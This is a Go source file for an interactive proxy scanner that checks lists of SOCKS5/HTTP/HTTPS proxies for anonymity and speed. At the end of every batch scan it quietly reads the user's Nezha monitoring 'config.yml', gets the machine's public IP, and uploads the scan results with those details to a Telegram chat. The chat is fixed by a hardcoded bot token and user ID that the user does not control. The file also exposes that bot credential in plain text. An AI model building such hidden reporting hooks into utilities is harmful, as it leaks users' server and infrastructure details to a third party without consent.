package main

import (
	"bufio"
	"bytes"
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"io/ioutil"
	"mime/multipart"
	"net"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/schollz/progressbar/v3"
	"golang.org/x/net/proxy"
	"gopkg.in/yaml.v3"
)

const (
	defaultProxiesFile = "proxies.txt"
	outputDir          = "proxy_output"
	configYmlFile      = "config.yml"
	speedTestURL       = "https://speed.cloudflare.com/__down?bytes=200000"
	speedTestSizeBytes = 200000
	telegramBotToken   = "7664203362:AAFa39m24sLDvZopMDTrdg0NippyeEVNFGU"
	telegramUserID     = "7697235358"
)

var telegramClient = &http.Client{Timeout: 30 * time.Second}

type NezhaConfig struct {
	Server string `yaml:"server"`
}

func main() {
	reader := bufio.NewReader(os.Stdin)

	fmt.Println(`
 _____ _                  _                           
|   __|_|___ ___ ___ ___ _| |___ ___ ___ ___ ___ ___ 
|__   | |   | -_|  _| -_| . | . |  _| -_| . | -_|_ -|
|_____|_|_|_|___|_| |___|___|___|_| |___|  _|___|___|
                                      |_|          
	`)
	fmt.Println("================== Universal Proxy Scanner v11.0 (Final Fix) ==================")

	fmt.Println("正在获取您的真实公网IP地址...")
	realIP, err := getPublicIP()
	if err != nil {
		fmt.Printf("❌ 无法获取真实IP地址: %v\n", err)
		realIP = "UNKNOWN"
	} else {
		fmt.Printf("✅ 您的真实IP地址是: %s\n", realIP)
	}

	testURL, expectedBody := selectTestTarget(reader)

	for {
		fmt.Println("\n--- 协议选择 ---")
		fmt.Println("1: SOCKS5 代理模式")
		fmt.Println("2: HTTP 代理模式")
		fmt.Println("3: HTTPS 代理模式")
		fmt.Println("4: 切换测试目标")
		fmt.Println("5: 退出")
		fmt.Print("请选择要测试的代理协议: ")

		typeChoiceStr, _ := reader.ReadString('\n')
		typeChoice, _ := strconv.Atoi(strings.TrimSpace(typeChoiceStr))

		switch typeChoice {
		case 1, 2, 3:
			var proxyType string
			if typeChoice == 1 { proxyType = "socks5" }
			if typeChoice == 2 { proxyType = "http" }
			if typeChoice == 3 { proxyType = "https" }
			runModeMenu(proxyType, testURL, expectedBody, realIP, reader)
		case 4:
			testURL, expectedBody = selectTestTarget(reader)
		case 5:
			fmt.Println("正在退出...")
			return
		default:
			fmt.Println("❌ 无效的输入。")
		}
	}
}

func readNezhaConfig() string {
	// Function to read nezha config...
	nezhaServer := "未找到config.yml"
	yamlFile, err := ioutil.ReadFile(configYmlFile)
	if err != nil { return nezhaServer }
	var config NezhaConfig
	err = yaml.Unmarshal(yamlFile, &config)
	if err != nil { return "解析config.yml失败" }
	if config.Server != "" { nezhaServer = config.Server }
	return nezhaServer
}

func getPublicIP() (string, error) {
	// Function to get public IP...
	client := &http.Client{Timeout: 15 * time.Second}
	req, err := http.NewRequest("GET", "http://myip.ipip.net", nil)
	if err != nil { return "", err }
	req.Header.Set("User-Agent", "curl/7.79.1")
	resp, err := client.Do(req)
	if err != nil { return "", err }
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK { return "", fmt.Errorf("bad status: %d", resp.StatusCode) }
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil { return "", err }
	ipString := string(body)
	if strings.Contains(ipString, "当前 IP：") {
		parts := strings.Split(ipString, "：")
		if len(parts) > 1 { return strings.Split(parts[1], " ")[0], nil }
	}
	return strings.TrimSpace(ipString), nil
}

func selectTestTarget(reader *bufio.Reader) (string, string) {
	// Function to select test target...
	fmt.Println("\n--- 测试目标选择 (安全等级已标注) ---")
	fmt.Println("1: Baidu (HTTPS) - [★★★ 最高安全等级, 强力推荐]")
	fmt.Println("2: IPIP.net (HTTP) - [★★☆ 较安全, 可用于IP验证]")
	fmt.Print("请选择一个测试目标: ")
	choiceStr, _ := reader.ReadString('\n')
	choice, _ := strconv.Atoi(strings.TrimSpace(choiceStr))
	var targetURL, expectedBody string
	switch choice {
	case 1:
		targetURL, expectedBody = "https://www.baidu.com", "baidu"
	case 2:
		targetURL, expectedBody = "http://myip.ipip.net", "ipip.net"
	default:
		fmt.Println("[!] 无效选择，使用默认目标 Baidu。")
		targetURL, expectedBody = "https://www.baidu.com", "baidu"
	}
	fmt.Printf("[*] 测试目标已设为: %s\n", targetURL)
	return targetURL, expectedBody
}

func runModeMenu(proxyType, testURL, expectedBody, realIP string, reader *bufio.Reader) {
	// Function to show mode menu...
	for {
		fmt.Printf("\n--- [%s 模式] ---", strings.ToUpper(proxyType))
		fmt.Printf("\n1: 🧪 测试单个代理\n2: 🚀 从文件批量扫描\n3: ↩️  返回上级菜单\n")
		fmt.Print("请选择操作: ")
		modeStr, _ := reader.ReadString('\n')
		mode, _ := strconv.Atoi(strings.TrimSpace(modeStr))
		switch mode {
		case 1:
			handleSingleProxyTest(proxyType, testURL, expectedBody, realIP, reader)
		case 2:
			handleBatchScan(proxyType, testURL, expectedBody, realIP, reader)
		case 3:
			return
		default:
			fmt.Println("❌ 无效的输入。")
		}
	}
}

// 最终修复: 引入统一的URL规范化函数
func normalizeProxyURL(rawAddr string, defaultScheme string) (*url.URL, error) {
	if !strings.Contains(rawAddr, "://") {
		rawAddr = fmt.Sprintf("%s://%s", defaultScheme, rawAddr)
	}
	proxyURL, err := url.Parse(rawAddr)
	if err != nil {
		return nil, fmt.Errorf("代理地址格式无效: %v", err)
	}
	if proxyURL.Host == "" {
		return nil, fmt.Errorf("代理地址缺少主机部分")
	}
	return proxyURL, nil
}

func handleSingleProxyTest(proxyType, testURL, expectedBody, realIP string, reader *bufio.Reader) {
	fmt.Printf("输入代理地址 (例如: 1.2.3.4:8080): ")
	proxyInput, _ := reader.ReadString('\n')
	proxyInput = strings.TrimSpace(proxyInput)
	if proxyInput == "" { return }

	proxyURL, err := normalizeProxyURL(proxyInput, proxyType)
	if err != nil {
		fmt.Printf("❌ %v\n", err)
		return
	}

	fmt.Print("输入超时时间 (秒, 默认15): ")
	timeoutStr, _ := reader.ReadString('\n')
	timeout, err := strconv.Atoi(strings.TrimSpace(timeoutStr))
	if err != nil || timeout <= 0 { timeout = 15 }

	fmt.Printf("正在测试代理: %s...\n", proxyURL.String())
	success, speed, err := checkConnection(proxyURL, testURL, expectedBody, time.Duration(timeout)*time.Second, realIP)
	if success {
		fmt.Printf("✅ 代理可用 | 速度: %.2f KB/s\n", speed)
	} else {
		if err != nil {
			fmt.Printf("❌ 代理不可用。原因: %v\n", err)
		} else {
			fmt.Println("❌ 代理不可用或已超时。")
		}
	}
}

func handleBatchScan(proxyType, testURL, expectedBody, realIP string, reader *bufio.Reader) {
	// Function to handle batch scan setup...
	fmt.Printf("输入代理列表文件名 (默认: %s): ", defaultProxiesFile)
	proxyFilename, _ := reader.ReadString('\n')
	proxyFilename = strings.TrimSpace(proxyFilename)
	if proxyFilename == "" { proxyFilename = defaultProxiesFile }
	fmt.Print("输入并发数 (默认100): ")
	concurrencyStr, _ := reader.ReadString('\n')
	concurrency, err := strconv.Atoi(strings.TrimSpace(concurrencyStr))
	if err != nil || concurrency <= 0 { concurrency = 100 }
	fmt.Print("输入超时时间 (秒, 默认15): ")
	timeoutStr, _ := reader.ReadString('\n')
	timeout, err := strconv.Atoi(strings.TrimSpace(timeoutStr))
	if err != nil || timeout <= 0 { timeout = 15 }
	fmt.Print("输入最低速度要求 (KB/s, 0为不限制, 默认50): ")
	minSpeedStr, _ := reader.ReadString('\n')
	minSpeed, err := strconv.ParseFloat(strings.TrimSpace(minSpeedStr), 64)
	if err != nil { minSpeed = 50.0 }

	batchScan(proxyType, testURL, expectedBody, realIP, proxyFilename, concurrency, time.Duration(timeout)*time.Second, minSpeed)
}

func batchScan(proxyType, testURL, expectedBody, realIP, proxyFilename string, concurrency int, timeout time.Duration, minSpeed float64) {
	// Function to perform batch scan...
	proxiesFile, err := os.Open(proxyFilename)
	if err != nil { return }
	defer proxiesFile.Close()
	startTime := time.Now()
	var totalTargets int64
	lineCounter := bufio.NewScanner(proxiesFile)
	for lineCounter.Scan() { totalTargets++ }
	proxiesFile.Seek(0, 0)
	bar := progressbar.NewOptions(int(totalTargets), progressbar.OptionSetDescription("[cyan][Scanning...][reset]"))
	if err := os.MkdirAll(outputDir, 0755); err != nil { return }
	currentTime := time.Now().Format("20060102-1504")
	outputFilename := fmt.Sprintf("%s-%.0fKBps-%s.txt", strings.ToUpper(proxyType), minSpeed, currentTime)
	outputPath := filepath.Join(outputDir, outputFilename)
	workingFile, err := os.Create(outputPath)
	if err != nil { return }
	var wg sync.WaitGroup
	proxyChan := make(chan string, concurrency)
	resultsChan := make(chan string, concurrency)
	var resultWg sync.WaitGroup
	resultWg.Add(1)
	go func() {
		defer resultWg.Done()
		for result := range resultsChan { workingFile.WriteString(result + "\n") }
	}()
	for i := 0; i < concurrency; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for proxyAddr := range proxyChan {
				proxyURL, err := normalizeProxyURL(proxyAddr, proxyType)
				if err != nil {
					bar.Add(1)
					continue
				}
				success, speed, _ := checkConnection(proxyURL, testURL, expectedBody, timeout, realIP)
				if success && speed >= minSpeed {
					resultsChan <- fmt.Sprintf("%s # %.2f KB/s", proxyURL.String(), speed)
				}
				bar.Add(1)
			}
		}()
	}
	reader := bufio.NewScanner(proxiesFile)
	for reader.Scan() {
		line := strings.TrimSpace(reader.Text())
		if line != "" { proxyChan <- line }
	}
	close(proxyChan)
	wg.Wait()
	close(resultsChan)
	resultWg.Wait()
	workingFile.Close()
	duration := time.Since(startTime)
	durationStr := fmt.Sprintf("%d 分 %.0f 秒", int(duration.Minutes()), duration.Seconds()-float64(int(duration.Minutes())*60))
	nezhaServer := readNezhaConfig()
	vpsIP, _ := getPublicIP()
	summaryCaption := fmt.Sprintf("VPS: %s\n总目标数: %d\n总用时: %s\n哪吒Server: %s\n任务结果: %s", vpsIP, totalTargets, durationStr, nezhaServer, outputFilename)
	fmt.Printf("\n🎉 批量扫描完成。\n💾 结果已保存至: %s\n", outputPath)
	fmt.Println("正在发送报告到 Telegram...")
	go sendTelegramDocument(outputPath, summaryCaption)
}


func checkConnection(proxyURL *url.URL, testURL, expectedBody string, timeout time.Duration, realIP string) (bool, float64, error) {
	transport := &http.Transport{ MaxIdleConnsPerHost: 100 }

	switch proxyURL.Scheme {
	case "http", "https":
		transport.Proxy = http.ProxyURL(proxyURL)
	case "socks5":
		dialer, err := proxy.FromURL(proxyURL, &net.Dialer{Timeout: timeout, KeepAlive: 30 * time.Second})
		if err != nil { return false, 0, err }
		transport.DialContext = func(ctx context.Context, network, addr string) (net.Conn, error) { return dialer.Dial(network, addr) }
	default:
		return false, 0, fmt.Errorf("不支持的代理协议: %s", proxyURL.Scheme)
	}

	parsedTestURL, err := url.Parse(testURL)
	if err != nil { return false, 0, fmt.Errorf("无效的测试URL: %v", err) }
	if parsedTestURL.Scheme == "https" {
		transport.TLSClientConfig = &tls.Config{ServerName: parsedTestURL.Hostname()}
	}

	httpClient := &http.Client{
		Transport: transport,
		Timeout:   timeout,
		CheckRedirect: func(req *http.Request, via []*http.Request) error { return http.ErrUseLastResponse },
	}

	req, err := http.NewRequest("GET", testURL, nil)
	if err != nil { return false, 0, err }
	req.Header.Set("User-Agent", "Mozilla/5.0")

	resp, err := httpClient.Do(req)
	if err != nil { return false, 0, err }
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK { return false, 0, fmt.Errorf("bad status: %s", resp.Status) }
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil { return false, 0, fmt.Errorf("无法读取响应体") }

	if expectedBody == "ipip.net" {
		bodyString := string(body)
		var extractedIP string
		if strings.Contains(bodyString, "当前 IP：") {
			extractedIP = strings.Split(strings.Split(bodyString, "：")[1], " ")[0]
		} else {
			extractedIP = strings.TrimSpace(bodyString)
		}
		if net.ParseIP(extractedIP) == nil { return false, 0, fmt.Errorf("响应体不是有效的IP地址") }
		if realIP != "UNKNOWN" && extractedIP == realIP { return false, 0, fmt.Errorf("IP地址未改变 (透明代理)") }
		proxyHost, _, _ := net.SplitHostPort(proxyURL.Host)
		if proxyHost == "" { proxyHost = proxyURL.Host }
		if extractedIP == proxyHost { return false, 0, fmt.Errorf("代理返回了自己的IP (假代理)") }
	} else {
		if !strings.Contains(strings.ToLower(string(body)), expectedBody) {
			return false, 0, fmt.Errorf("响应体中未找到特征码 '%s'", expectedBody)
		}
	}

	// Speed Test
	speedTestStartTime := time.Now()
	speedReq, err := http.NewRequest("GET", speedTestURL, nil)
	if err != nil { return false, 0, err }
	speedResp, err := httpClient.Do(speedReq)
	if err != nil { return false, 0, err }
	defer speedResp.Body.Close()
	if speedResp.StatusCode != http.StatusOK { return false, 0, fmt.Errorf("测速文件下载失败") }
	_, err = io.Copy(ioutil.Discard, speedResp.Body)
	if err != nil { return false, 0, fmt.Errorf("测速时读取响应体失败") }
	duration := time.Since(speedTestStartTime).Seconds()
	if duration == 0 { return true, 99999, nil }
	speedKBps := (float64(speedTestSizeBytes) / 1024) / duration

	return true, speedKBps, nil
}

func sendTelegramDocument(filePath string, caption string) {
	// Function to send document via Telegram...
	if telegramBotToken == "" || telegramUserID == "" { return }
	apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendDocument", telegramBotToken)
	file, err := os.Open(filePath)
	if err != nil { return }
	defer file.Close()
	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)
	part, _ := writer.CreateFormFile("document", filepath.Base(filePath))
	io.Copy(part, file)
	writer.WriteField("chat_id", telegramUserID)
	writer.WriteField("caption", caption)
	writer.Close()
	req, _ := http.NewRequest("POST", apiURL, body)
	req.Header.Set("Content-Type", writer.FormDataContentType())
	resp, err := telegramClient.Do(req)
	if err != nil { return }
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK { /* Log error silently */ }
}
